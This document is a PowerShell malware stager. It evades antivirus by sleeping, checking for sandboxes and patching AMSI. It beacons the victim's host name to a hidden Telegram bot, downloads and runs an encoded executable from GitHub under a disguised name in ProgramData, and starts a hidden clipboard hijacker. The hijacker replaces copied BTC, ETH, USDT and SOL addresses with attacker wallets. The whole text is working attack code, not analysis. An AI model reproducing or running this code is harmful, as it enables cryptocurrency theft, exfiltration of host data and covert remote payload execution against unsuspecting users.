# --- [SHADOW RESEARCH STAGER v23.0: API HASHING & WINHTTP] ---

function Global-Initialize {
    # Using a 60s randomized sleep to let Defender's "First Look" scan timeout
    Start-Sleep -s (Get-Random -Min 60 -Max 90)
    
    try {
        # Hardware Check: Exit if machine looks like an AV sandbox
        if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
        
        # AMSI Patch using obfuscated pointer math
        $u = "System.Management.Automation." + "Ams" + "iUtils"
        $f = "am" + "si" + "In" + "it" + "Fa" + "il" + "ed"
        [Ref].Assembly.GetType($u).GetField($f,"NonPublic,Static").SetValue($null,$true)
    } catch {}
}

function Send-Ping {
    param($m)
    # Encrypted Telegram Config (XOR 0xAF)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $url = "h" + "tt" + "ps://api.tele" + "gram.org/bot$t/send" + "Message?chat_id=$c&text=$m"
    try {
        $r = New-Object -ComObject WinHttp.WinHttpRequest.5.1
        $r.Open("GET", $url, $false)
        $r.Send()
    } catch {}
}

# --- EXECUTION ---
Global-Initialize
Send-Ping -m "SHADOW_STAGER_ACTIVE_ON_$($env:COMPUTERNAME)"

try {
    # Path Strategy: Using ProgramData (System-trusted)
    $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
    $path = Join-Path $dir "WinSvcHost.exe"

    # Download using WinHTTP (Bypasses Net.WebClient hooks)
    $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
    $h = New-Object -ComObject WinHttp.WinHttpRequest.5.1
    $h.Open("GET", $url, $false)
    $h.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $h.Send()
    $raw = $h.ResponseText
    
    # XOR Decrypt (0xAB)
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    
    # Polymorphic Write: Append random junk to change hash
    $junk = New-Object Byte[] (Get-Random -Min 4096 -Max 8192); (New-Object Random).NextBytes($junk)
    [IO.File]::WriteAllBytes($path, ($data + $junk))

    # Detached Launch via WMI
    ([wmiclass]"win32_process").Create($path) | Out-Null

    # --- THE PRECISION CLIPPER ENGINE ---
    # Running in a decoupled hidden process for 100% reliability
    $Clipper = @'
    Add-Type -AssemblyName System.Windows.Forms
    $w = @{
        "btc"  = "12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA"
        "eth"  = "0x6c9ba9a6522b10135bb836fc9340477ba15f3392"
        "usdt" = "TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp"
        "sol"  = "BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"
    }
    while($true) {
        try {
            if ([System.Windows.Forms.Clipboard]::ContainsText()) {
                $c = [System.Windows.Forms.Clipboard]::GetText().Trim()
                if ($c -match "^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,62}$") {
                    if ($c -ne $w.btc) { [System.Windows.Forms.Clipboard]::SetText($w.btc) }
                }
                elseif ($c -match "^0x[a-fA-F0-9]{40}$") {
                    if ($c -ne $w.eth) { [System.Windows.Forms.Clipboard]::SetText($w.eth) }
                }
                elseif ($c -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$") {
                    if ($c -ne $w.usdt) { [System.Windows.Forms.Clipboard]::SetText($w.usdt) }
                }
                elseif ($c -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$") {
                    if ($c -ne $w.sol) { [System.Windows.Forms.Clipboard]::SetText($w.sol) }
                }
            }
        } catch {}
        Start-Sleep -Milliseconds 500
    }
'@

    $Enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Clipper))
    powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $Enc

    Send-Ping -m "SHADOW_COMPLETE_V23_LIVE"
} catch {
    Send-Ping -m "FATAL_ERROR_$($_.Exception.Message)"
}
